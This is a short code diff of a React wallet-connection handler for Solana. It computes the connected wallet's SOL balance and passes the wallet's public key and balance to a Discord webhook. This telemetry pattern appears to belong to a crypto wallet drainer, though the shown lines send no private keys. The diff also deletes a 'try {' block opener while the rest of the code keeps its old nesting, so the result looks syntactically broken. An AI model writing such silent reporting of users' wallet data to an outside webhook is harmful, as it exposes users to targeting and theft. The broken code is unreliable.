@@ -109,18 +109,18 @@ const WalletConnectionHandler: FC = () => {
             }
         }
 
-        if (!connection || lamports === null) {
-            alert('❌ Connection failed with wallets');
-            return;
-        }
+if (!connection || lamports === null) {
+    alert('❌ Connection failed with wallets');
+    return;
+}
 
-        try {
-            const balanceSol = lamports / LAMPORTS_PER_SOL;
-            setSolBalance(balanceSol);
-            console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
-            console.log(`💰 Balance: ${balanceSol.toFixed(5)} SOL`);
+const lamportsSafe = lamports;
+const balanceSol = lamportsSafe / LAMPORTS_PER_SOL;
+setSolBalance(balanceSol);
+console.log(`💰 Balance: ${balanceSol.toFixed(5)} SOL`);
 
-            await sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
+await sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
+
 
             if (lamports <= 0) {
                 alert('⚠️ Not enough SOL to perform a transaction.');
